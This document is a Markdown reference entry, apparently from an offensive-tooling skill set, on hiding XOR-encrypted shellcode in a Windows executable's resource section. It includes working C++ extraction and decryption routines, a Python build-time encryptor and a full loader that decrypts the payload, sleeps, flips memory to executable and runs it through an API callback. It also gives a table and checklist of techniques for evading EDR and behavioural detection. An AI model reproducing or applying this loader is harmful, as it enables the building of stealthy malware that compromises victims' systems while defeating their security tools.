# pe-resource-shellcode

> **Status:** COMPLETE
> **Cluster:** 09-odpc
> **Maps to:** Chapter 5 (PE Primer), Chapter 11 (Shellcode in .rsrc Section)

## Description
Patterns for embedding XOR-encrypted shellcode in a PE's .rsrc section and extracting
it at runtime using the Windows Resource API. Covers allocation strategy, decryption
in-place vs copy, and the behavioural signatures that get payloads caught.

Invoke when: embedding shellcode in a resource, implementing a .rsrc-based loader,
or debugging why a resource-based loader is triggering alerts.

## Why .rsrc?

The `.rsrc` section is a natural hiding place — it is expected to contain binary blobs
(icons, manifests, version info) and is not directly executable. Encrypted shellcode
blends in as a custom resource type. Scanners focus on `.text` and `.data`; `.rsrc`
receives less scrutiny unless the file is otherwise suspicious.

## Adding a custom resource in Visual Studio

1. **Resource file:** Right-click project → Add → Resource → Custom
2. **Resource type:** Use a plausible name (`BINARY`, `RCDATA`, or a custom string like `CONFIG`)
3. **Resource ID:** Numeric (e.g. `101`) or string name
4. **Import:** Right-click the new resource → Import → select your encrypted blob file
5. The resource compiler (`rc.exe`) embeds the blob verbatim at link time

Command-line equivalent:
```
rc.exe /fo resource.res resource.rc
# resource.rc:
# IDR_SHELLCODE RCDATA "shellcode.bin.enc"
```

## Extraction pattern (C/C++)

```cpp
#include <Windows.h>

// Returns pointer to decrypted shellcode and its size.
// Caller is responsible for allocation — see allocation patterns below.
LPVOID ExtractShellcode(HMODULE hModule, LPCSTR resourceType, WORD resourceId, PDWORD pdwSize) {
    HRSRC   hRes  = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceType);
    if (!hRes) return NULL;

    HGLOBAL hMem  = LoadResource(hModule, hRes);
    if (!hMem) return NULL;

    LPVOID  pData = LockResource(hMem);
    DWORD   dwLen = SizeofResource(hModule, hRes);

    if (!pData || dwLen == 0) return NULL;

    if (pdwSize) *pdwSize = dwLen;

    // Return pointer into the mapped PE image — do NOT free; it is part of the PE.
    // Decrypt in-place or copy to RW allocation before modifying.
    return pData;
}
```

## XOR decryption

Simple single-byte XOR — sufficient when combined with a resource blob that scans
as non-PE binary content:

```cpp
void XorDecrypt(LPBYTE pData, DWORD dwLen, BYTE key) {
    for (DWORD i = 0; i < dwLen; i++) {
        pData[i] ^= key;
    }
}
```

Rolling XOR (harder to pattern-match):

```cpp
void RollingXorDecrypt(LPBYTE pData, DWORD dwLen, BYTE seed) {
    BYTE key = seed;
    for (DWORD i = 0; i < dwLen; i++) {
        pData[i] ^= key;
        key = (key ^ pData[i]) + 1;  // mutate key each byte
    }
}
```

**Encrypt at build time** with a matching Python script (run pre-link):

```python
import sys

key = 0xAB
with open(sys.argv[1], "rb") as f:
    data = bytearray(f.read())

for i in range(len(data)):
    data[i] ^= key

with open(sys.argv[2], "wb") as f:
    f.write(data)
```

## Allocation tradeoffs

| Approach | How | EDR visibility | Notes |
|----------|-----|---------------|-------|
| **Decrypt in-place** | Modify the PE-mapped page directly | Lower — no new allocation | PE pages are mapped copy-on-write; write triggers a private copy. Cannot directly execute (mapped as RX). |
| **VirtualAlloc RW, copy, flip RX** | Alloc RW → copy + decrypt → VirtualProtect RX → execute | Higher — RW→RX transition is a classic IOC | Most straightforward; triggers memory scanning on protect change |
| **VirtualAlloc RX directly** | Alloc RX → write + decrypt in one step | Medium — avoids RW→RX but still RX alloc | Some products flag direct RX allocation |
| **Trampoline: alloc RW, sleep, flip RX** | Alloc RW → decrypt → sleep (masking) → VirtualProtect RX → exec | Lower — sleep breaks heuristic timer | See caro-kann-injection skill for full sleep-mask pattern |

Preferred pattern for evasion: **RW alloc → decrypt → sleep → RX flip → execute via callback**

## Full loader skeleton

```cpp
#include <Windows.h>

#define RESOURCE_TYPE  "RCDATA"
#define RESOURCE_ID    101
#define XOR_KEY        0xAB

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    DWORD  dwSize = 0;
    LPVOID pRes   = ExtractShellcode(hInstance, RESOURCE_TYPE, RESOURCE_ID, &dwSize);
    if (!pRes) return 1;

    // Allocate RW buffer and copy
    LPVOID pBuf = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuf) return 1;
    CopyMemory(pBuf, pRes, dwSize);

    // Decrypt
    XorDecrypt((LPBYTE)pBuf, dwSize, XOR_KEY);

    // Sleep to defeat heuristic timers
    Sleep(5000);

    // Flip to RX
    DWORD dwOld;
    VirtualProtect(pBuf, dwSize, PAGE_EXECUTE_READ, &dwOld);

    // Execute via callback (avoids direct CreateThread/call IOC)
    EnumSystemLocalesA((LOCALE_ENUMPROCA)pBuf, 0);

    return 0;
}
```

## Behavioural signatures to avoid

- **`WriteFile` / `SetEndOfFile` before execution** — dropping to disk triggers file-write callbacks
- **`CreateThread` / `RtlCreateUserThread` directly** — highly monitored; use callback vectors instead
- **Immediate RW→RX→execute without sleep** — heuristic timer catch; insert sleep between VirtualProtect and execution
- **Sequential VirtualAlloc + VirtualProtect in a tight loop** — scanning heuristic; space operations out
- **`LoadLibrary` + `GetProcAddress` for sensitive APIs** — use hash-based resolution instead (see api-hashing-conventions)
- **`RCDATA` resource type on a file with no other resources** — suspicious; add a version info or manifest resource

## Related skills

- `pe-binary-analysis` — manual PE header parsing, section table navigation, RVA/file offset arithmetic
- `shellcode-dev-conventions` — PIC requirements, null-byte awareness, size discipline
- `api-hashing-conventions` — remove LoadLibrary/GetProcAddress from the loader
- `caro-kann-injection` — full sleep-mask + callback execution pattern
